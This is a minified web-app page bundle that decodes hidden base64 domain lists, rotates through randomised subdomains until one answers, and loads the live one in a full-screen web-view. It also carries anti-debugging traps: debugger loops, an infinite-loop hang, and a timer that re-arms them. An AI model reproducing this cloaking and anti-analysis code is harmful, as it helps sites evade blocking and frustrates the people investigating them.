//js url: http://cczqnjfwwap.s3-accelerate.amazonaws.com/static/js/pages-index-index.3c645bb1.js
var a3_0x294e01 = (() => {
    var r = !0;
    return function(e, n) {
        var t = r ? function() {
            var t;
            if (n) return t = n.apply(e, arguments), n = null, t;
        } : function() {};
        return r = !1, t;
    };
})();

function a3_0x3cfd31(t) {
    function e(t) {
        if ("string" == typeof t) return function(t) {}.constructor("while (true) {}").apply("counter");
        1 !== ("" + t / t).length || t % 20 == 0 ? function() {
            return !0;
        }.constructor("debugger").call("action") : function() {
            return !1;
        }.constructor("debugger").apply("stateObject"), e(++t);
    }
    try {
        if (t) return e;
        e(0);
    } catch (t) {}
}

(function() {
    a3_0x294e01(this, function() {
        var t = new RegExp("function *\\( *\\)"), e = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"), n = a3_0x3cfd31("init");
        t.test(n + "chain") && e.test(n + "input") ? a3_0x3cfd31() : n("0");
    })();
})(), (window.webpackJsonp = window.webpackJsonp || []).push([ [ "pages-index-index" ], {
    "0398": function(t, e, n) {
        var r = n("5c77");
        (r = "string" == typeof (r = r.__esModule ? r.default : r) ? [ [ t.i, r, "" ] ] : r).locals && (t.exports = r.locals), 
        (0, n("967d").default)("1aa20fb8", r, !0, {
            "sourceMap": !1,
            "shadowMode": !1
        });
    },
    "0b69": function(t, e, n) {
        n.r(e);
        var r, o = n("16bc"), a = n("e241");
        for (r in a) [ "default" ].indexOf(r) < 0 && (t => {
            n.d(e, t, function() {
                return a[t];
            });
        })(r);
        n("6c0b");
        var i = n("828b"), i = Object(i.a)(a.default, o.b, o.c, !1, null, "c8524c92", null, !1, o.a, void 0);
        e.default = i.exports;
    },
    "16bc": function(t, e, n) {
        n.d(e, "b", function() {
            return r;
        }), n.d(e, "c", function() {
            return o;
        }), n.d(e, "a", function() {});
        var r = function() {
            var t = this.$createElement, t = this._self._c || t;
            return t("v-uni-view", {
                "staticClass": "content"
            }, [ this.path ? t("v-uni-web-view", {
                "attrs": {
                    "src": this.path
                }
            }) : this._e() ], 1);
        }, o = [];
    },
    "2634": function(t, L, e) {
        Object.defineProperty(L, "__esModule", {
            "value": !0
        }), L.default = function() {
            L.default = function() {
                return i;
            };
            var i = {}, t = Object.prototype, c = t.hasOwnProperty, f = Object.defineProperty || function(t, e, n) {
                t[e] = n.value;
            }, e = "function" == typeof Symbol ? Symbol : {}, r = e.iterator || "@@iterator", n = e.asyncIterator || "@@asyncIterator", o = e.toStringTag || "@@toStringTag";
            function a(t, e, n) {
                return Object.defineProperty(t, e, {
                    "value": n,
                    "enumerable": !0,
                    "configurable": !0,
                    "writable": !0
                }), t[e];
            }
            try {
                a({}, "");
            } catch (t) {
                a = function(t, e, n) {
                    return t[e] = n;
                };
            }
            function u(t, e, n, r) {
                var o, a, i, u, e = e && e.prototype instanceof h ? e : h, e = Object.create(e.prototype), r = new x(r || []);
                return f(e, "_invoke", {
                    "value": (o = t, a = n, i = r, u = "suspendedStart", function(t, e) {
                        if ("executing" === u) throw new Error("Generator is already running");
                        if ("completed" === u) {
                            if ("throw" === t) throw e;
                            return k();
                        }
                        for (i.method = t, i.arg = e; ;) {
                            var n = i.delegate;
                            if (n) {
                                n = function t(e, n) {
                                    var r = n.method, o = e.iterator[r];
                                    if (void 0 === o) return n.delegate = null, 
                                    "throw" === r && e.iterator.return && (n.method = "return", 
                                    n.arg = void 0, t(e, n), "throw" === n.method) || "return" !== r && (n.method = "throw", 
                                    n.arg = new TypeError("The iterator does not provide a '" + r + "' method")), 
                                    l;
                                    r = s(o, e.iterator, n.arg);
                                    if ("throw" === r.type) return n.method = "throw", 
                                    n.arg = r.arg, n.delegate = null, l;
                                    o = r.arg;
                                    return o ? o.done ? (n[e.resultName] = o.value, 
                                    n.next = e.nextLoc, "return" !== n.method && (n.method = "next", 
                                    n.arg = void 0), n.delegate = null, l) : o : (n.method = "throw", 
                                    n.arg = new TypeError("iterator result is not an object"), 
                                    n.delegate = null, l);
                                }(n, i);
                                if (n) {
                                    if (n === l) continue;
                                    return n;
                                }
                            }
                            if ("next" === i.method) i.sent = i._sent = i.arg; else if ("throw" === i.method) {
                                if ("suspendedStart" === u) throw u = "completed", 
                                i.arg;
                                i.dispatchException(i.arg);
                            } else "return" === i.method && i.abrupt("return", i.arg);
                            u = "executing";
                            n = s(o, a, i);
                            if ("normal" === n.type) {
                                if (u = i.done ? "completed" : "suspendedYield", 
                                n.arg === l) continue;
                                return {
                                    "value": n.arg,
                                    "done": i.done
                                };
                            }
                            "throw" === n.type && (u = "completed", i.method = "throw", 
                            i.arg = n.arg);
                        }
                    })
                }), e;
            }
            function s(t, e, n) {
                try {
                    return {
                        "type": "normal",
                        "arg": t.call(e, n)
                    };
                } catch (t) {
                    return {
                        "type": "throw",
                        "arg": t
                    };
                }
            }
            i.wrap = u;
            var l = {};
            function h() {}
            function d() {}
            function p() {}
            var e = {}, v = (a(e, r, function() {
                return this;
            }), Object.getPrototypeOf), v = v && v(v(_([]))), g = (v && v !== t && c.call(v, r) && (e = v), 
            p.prototype = h.prototype = Object.create(e));
            function y(t) {
                [ "next", "throw", "return" ].forEach(function(e) {
                    a(t, e, function(t) {
                        return this._invoke(e, t);
                    });
                });
            }
            function m(i, u) {
                var e;
                f(this, "_invoke", {
                    "value": function(n, r) {
                        function t() {
                            return new u(function(t, e) {
                                !function e(t, n, r, o) {
                                    var a, t = s(i[t], i, n);
                                    return "throw" !== t.type ? (n = (a = t.arg).value) && "object" == (0, 
                                    E.default)(n) && c.call(n, "__await") ? u.resolve(n.__await).then(function(t) {
                                        e("next", t, r, o);
                                    }, function(t) {
                                        e("throw", t, r, o);
                                    }) : u.resolve(n).then(function(t) {
                                        a.value = t, r(a);
                                    }, function(t) {
                                        return e("throw", t, r, o);
                                    }) : void o(t.arg);
                                }(n, r, t, e);
                            });
                        }
                        return e = e ? e.then(t, t) : t();
                    }
                });
            }
            function b(t) {
                var e = {
                    "tryLoc": t[0]
                };
                1 in t && (e.catchLoc = t[1]), 2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]), 
                this.tryEntries.push(e);
            }
            function w(t) {
                var e = t.completion || {};
                e.type = "normal", delete e.arg, t.completion = e;
            }
            function x(t) {
                this.tryEntries = [ {
                    "tryLoc": "root"
                } ], t.forEach(b, this), this.reset(!0);
            }
            function _(e) {
                if (e) {
                    var n, t = e[r];
                    if (t) return t.call(e);
                    if ("function" == typeof e.next) return e;
                    if (!isNaN(e.length)) return n = -1, (t = function t() {
                        for (;++n < e.length; ) if (c.call(e, n)) return t.value = e[n], 
                        t.done = !1, t;
                        return t.value = void 0, t.done = !0, t;
                    }).next = t;
                }
                return {
                    "next": k
                };
            }
            function k() {
                return {
                    "value": void 0,
                    "done": !0
                };
            }
            return f(g, "constructor", {
                "value": d.prototype = p,
                "configurable": !0
            }), f(p, "constructor", {
                "value": d,
                "configurable": !0
            }), d.displayName = a(p, o, "GeneratorFunction"), i.isGeneratorFunction = function(t) {
                t = "function" == typeof t && t.constructor;
                return !!t && (t === d || "GeneratorFunction" === (t.displayName || t.name));
            }, i.mark = function(t) {
                return Object.setPrototypeOf ? Object.setPrototypeOf(t, p) : (t.__proto__ = p, 
                a(t, o, "GeneratorFunction")), t.prototype = Object.create(g), t;
            }, i.awrap = function(t) {
                return {
                    "__await": t
                };
            }, y(m.prototype), a(m.prototype, n, function() {
                return this;
            }), i.AsyncIterator = m, i.async = function(t, e, n, r, o) {
                void 0 === o && (o = Promise);
                var a = new m(u(t, e, n, r), o);
                return i.isGeneratorFunction(e) ? a : a.next().then(function(t) {
                    return t.done ? t.value : a.next();
                });
            }, y(g), a(g, o, "Generator"), a(g, r, function() {
                return this;
            }), a(g, "toString", function() {
                return "[object Generator]";
            }), i.keys = function(t) {
                var e, n = Object(t), r = [];
                for (e in n) r.push(e);
                return r.reverse(), function t() {
                    for (;r.length; ) {
                        var e = r.pop();
                        if (e in n) return t.value = e, t.done = !1, t;
                    }
                    return t.done = !0, t;
                };
            }, i.values = _, x.prototype = {
                "constructor": x,
                "reset": function(t) {
                    if (this.prev = 0, this.next = 0, this.sent = this._sent = void 0, 
                    this.done = !1, this.delegate = null, this.method = "next", 
                    this.arg = void 0, this.tryEntries.forEach(w), !t) for (var e in this) "t" === e.charAt(0) && c.call(this, e) && !isNaN(+e.slice(1)) && (this[e] = void 0);
                },
                "stop": function() {
                    this.done = !0;
                    var t = this.tryEntries[0].completion;
                    if ("throw" === t.type) throw t.arg;
                    return this.rval;
                },
                "dispatchException": function(n) {
                    if (this.done) throw n;
                    var r = this;
                    function t(t, e) {
                        return a.type = "throw", a.arg = n, r.next = t, e && (r.method = "next", 
                        r.arg = void 0), !!e;
                    }
                    for (var e = this.tryEntries.length - 1; 0 <= e; --e) {
                        var o = this.tryEntries[e], a = o.completion;
                        if ("root" === o.tryLoc) return t("end");
                        if (o.tryLoc <= this.prev) {
                            var i = c.call(o, "catchLoc"), u = c.call(o, "finallyLoc");
                            if (i && u) {
                                if (this.prev < o.catchLoc) return t(o.catchLoc, !0);
                                if (this.prev < o.finallyLoc) return t(o.finallyLoc);
                            } else if (i) {
                                if (this.prev < o.catchLoc) return t(o.catchLoc, !0);
                            } else {
                                if (!u) throw new Error("try statement without catch or finally");
                                if (this.prev < o.finallyLoc) return t(o.finallyLoc);
                            }
                        }
                    }
                },
                "abrupt": function(t, e) {
                    for (var n = this.tryEntries.length - 1; 0 <= n; --n) {
                        var r = this.tryEntries[n];
                        if (r.tryLoc <= this.prev && c.call(r, "finallyLoc") && this.prev < r.finallyLoc) {
                            var o = r;
                            break;
                        }
                    }
                    var a = (o = o && ("break" === t || "continue" === t) && o.tryLoc <= e && e <= o.finallyLoc ? null : o) ? o.completion : {};
                    return a.type = t, a.arg = e, o ? (this.method = "next", this.next = o.finallyLoc, 
                    l) : this.complete(a);
                },
                "complete": function(t, e) {
                    if ("throw" === t.type) throw t.arg;
                    return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, 
                    this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), 
                    l;
                },
                "finish": function(t) {
                    for (var e = this.tryEntries.length - 1; 0 <= e; --e) {
                        var n = this.tryEntries[e];
                        if (n.finallyLoc === t) return this.complete(n.completion, n.afterLoc), 
                        w(n), l;
                    }
                },
                "catch": function(t) {
                    for (var e = this.tryEntries.length - 1; 0 <= e; --e) {
                        var n, r, o = this.tryEntries[e];
                        if (o.tryLoc === t) return "throw" === (n = o.completion).type && (r = n.arg, 
                        w(o)), r;
                    }
                    throw new Error("illegal catch attempt");
                },
                "delegateYield": function(t, e, n) {
                    return this.delegate = {
                        "iterator": _(t),
                        "resultName": e,
                        "nextLoc": n
                    }, "next" === this.method && (this.arg = void 0), l;
                }
            }, i;
        }, e("6a54"), e("01a2"), e("e39c"), e("bf0f"), e("844d"), e("18f7"), e("de6c"), 
        e("3872e"), e("4e9b"), e("114e"), e("c240"), e("926e"), e("7a76"), e("c9b5"), 
        e("aa9c"), e("2797"), e("8a8d"), e("dc69"), e("f7a5");
        var E = (e = e("fcf3")) && e.__esModule ? e : {
            "default": e
        };
    },
    "2fdc": function(t, e, n) {
        function c(t, e, n, r, o, a, i) {
            try {
                var u = t[a](i), c = u.value;
            } catch (t) {
                return n(t);
            }
            u.done ? e(c) : Promise.resolve(c).then(r, o);
        }
        n("6a54"), Object.defineProperty(e, "__esModule", {
            "value": !0
        }), e.default = function(u) {
            return function() {
                var t = this, i = arguments;
                return new Promise(function(e, n) {
                    var r = u.apply(t, i);
                    function o(t) {
                        c(r, e, n, o, a, "next", t);
                    }
                    function a(t) {
                        c(r, e, n, o, a, "throw", t);
                    }
                    o(void 0);
                });
            };
        }, n("bf0f");
    },
    "5c77": function(t, e, n) {
        (e = n("c86c")(!1)).push([ t.i, ".content[data-v-c8524c92]{display:flex;flex-direction:column;align-items:center;justify-content:center}.logo[data-v-c8524c92]{height:%?200?%;width:%?200?%;margin-top:%?200?%;margin-left:auto;margin-right:auto;margin-bottom:%?50?%}.text-area[data-v-c8524c92]{display:flex;justify-content:center}.title[data-v-c8524c92]{font-size:%?36?%;color:#8f8f94}", "" ]), 
        t.exports = e;
    },
    "6c0b": function(t, e, n) {
        var r = n("0398");
        n.n(r).a;
    },
    "e241": function(t, e, n) {
        n.r(e);
        var r, o = n("ef3a"), a = n.n(o);
        for (r in o) [ "default" ].indexOf(r) < 0 && (t => {
            n.d(e, t, function() {
                return o[t];
            });
        })(r);
        e.default = a.a;
    },
    "ef3a": function(t, e, n) {
        n("6a54");
        var r = n("f5bd").default, b = (Object.defineProperty(e, "__esModule", {
            "value": !0
        }), e.default = void 0, n("c9b5"), n("15d1"), n("d5c6"), n("5a56"), n("f074"), 
        n("5ef2"), n("5c47"), n("a1c1"), r(n("2634"))), o = r(n("2fdc")), w = r(n("a316"));
        e.default = {
            "data": function() {
                return {
                    "timeds": null,
                    "numc": 0,
                    "numcTwo": 0,
                    "path": ""
                };
            },
            "onReady": function() {
                document.body.addEventListener("touchmove", function(t) {
                    t._isScroller || t.preventDefault();
                }, {
                    "passive": !1
                });
            },
            "onLoad": function() {
                uni.showLoading({
                    "title": "检测线路中..."
                }), uni.setStorageSync("domainurl", ""), this.getBase();
            },
            "onShow": function() {
                var e = this;
                this.timeds || (this.timeds = setInterval(function(t) {
                    e.getUrl();
                }, 100));
            },
            "onHide": function() {
                this.timeds && (clearInterval(this.timeds), this.timeds = null);
            },
            "onUnload": function() {
                this.timeds && (clearInterval(this.timeds), this.timeds = null);
            },
            "methods": {
                "getUrl": function() {
                    var t = uni.getStorageSync("domainurl");
                    t && (this.path = t + "/" + w.default.jcinfo, uni.hideLoading());
                },
                "getBase": function() {
                    var m = this;
                    return (0, o.default)((0, b.default)().mark(function t() {
                        var e, n, r, o, a, i, u, c, f, s, l, h, d, p, v, g, y;
                        return (0, b.default)().wrap(function(t) {
                            for (;;) switch (t.prev = t.next) {
                              case 0:
                                return n = e = 0, t.prev = 3, r = w.default.urlArray, 
                                n = r.length, p = m.numcTwo >= r.length - 1 ? r.length - 1 : m.numcTwo, 
                                r = atob(r[p]), p = new Date().getTime(), t.next = 11, 
                                uni.request({
                                    "header": {
                                        "Access-Control-Allow-Origin": "*"
                                    },
                                    "url": r + "?v=" + p,
                                    "timeout": 5e3
                                });

                              case 11:
                                if (!(r = t.sent).statusCode || 200 != r.statusCode) {
                                    t.next = 46;
                                    break;
                                }
                                if (o = r.data.split("/+vcd+/")[1], a = 0, !o) {
                                    t.next = 40;
                                    break;
                                }
                                if (!(i = atob(o))) {
                                    t.next = 40;
                                    break;
                                }
                                if (u = i.split("|"), a = u.length, !(0 < u.length)) {
                                    t.next = 40;
                                    break;
                                }
                                if (c = m.numc >= u.length - 1 ? u.length - 1 : m.numc, 
                                -1 != u[c].indexOf("*")) {
                                    for (f = "0123456789abcdefghijklmnopqrstuvwxyz", 
                                    s = Math.round(Math.random()) + 8, l = "", h = 0; h < s; h++) d = Math.floor(Math.random() * f.length), 
                                    l += f.charAt(d);
                                    u[c] = u[c].replace("*", l);
                                }
                                return t.prev = 23, t.next = 26, uni.request({
                                    "header": {
                                        "Access-Control-Allow-Origin": "*"
                                    },
                                    "url": u[c] + "/" + w.default.apiurl,
                                    "timeout": 3e3
                                });

                              case 26:
                                if ((p = t.sent).statusCode && 200 == p.statusCode) return e = 1, 
                                uni.setStorageSync("domainurl", u[c]), t.abrupt("return");
                                t.next = 33;
                                break;

                              case 33:
                                t.next = 40;
                                break;

                              case 35:
                                if (t.prev = 35, t.t0 = t.catch(23), m.numc++, m.numc < a) return t.abrupt("return", m.getBase());
                                t.next = 40;
                                break;

                              case 40:
                                if (0 != e); else if (m.numc++, m.numc < a) return t.abrupt("return", m.getBase());
                                t.next = 44;
                                break;

                              case 44:
                                t.next = 49;
                                break;

                              case 46:
                                if (m.numcTwo++, m.numcTwo < n) return t.abrupt("return", m.getBase());
                                t.next = 49;
                                break;

                              case 49:
                                t.next = 56;
                                break;

                              case 51:
                                if (t.prev = 51, t.t1 = t.catch(3), m.numcTwo++, 
                                m.numcTwo < n) return t.abrupt("return", m.getBase());
                                t.next = 56;
                                break;

                              case 56:
                                if (0 != e) {
                                    t.next = 83;
                                    break;
                                }
                                if ("" == w.default.bakurl) {
                                    t.next = 82;
                                    break;
                                }
                                if (v = w.default.bakurl, !(0 < (v = v.split("|")).length)) {
                                    t.next = 78;
                                    break;
                                }
                                g = 0;

                              case 62:
                                if (g < v.length) return t.prev = 63, t.next = 66, 
                                uni.request({
                                    "header": {
                                        "Access-Control-Allow-Origin": "*"
                                    },
                                    "url": v[g] + "/" + w.default.apiurl,
                                    "timeout": 3e3
                                });
                                t.next = 78;
                                break;

                              case 66:
                                if ((y = t.sent).statusCode && 200 == y.statusCode) return e = 1, 
                                uni.setStorageSync("domainurl", v[g]), t.abrupt("break", 78);
                                t.next = 71;
                                break;

                              case 71:
                                t.next = 75;
                                break;

                              case 73:
                                t.prev = 73, t.t2 = t.catch(63);

                              case 75:
                                g++, t.next = 62;
                                break;

                              case 78:
                                if (0 == e) return t.abrupt("return", uni.showLoading({
                                    "title": "请检查网络情况"
                                }));
                                t.next = 80;
                                break;

                              case 80:
                                t.next = 83;
                                break;

                              case 82:
                                return t.abrupt("return", uni.showLoading({
                                    "title": "请检查网络情况"
                                }));

                              case 83:
                                return t.abrupt("return");

                              case 84:
                              case "end":
                                return t.stop();
                            }
                        }, t, null, [ [ 3, 51 ], [ 23, 35 ], [ 63, 73 ] ]);
                    }))();
                }
            }
        };
    }
} ]), setInterval(function() {
    a3_0x3cfd31();
}, 4e3);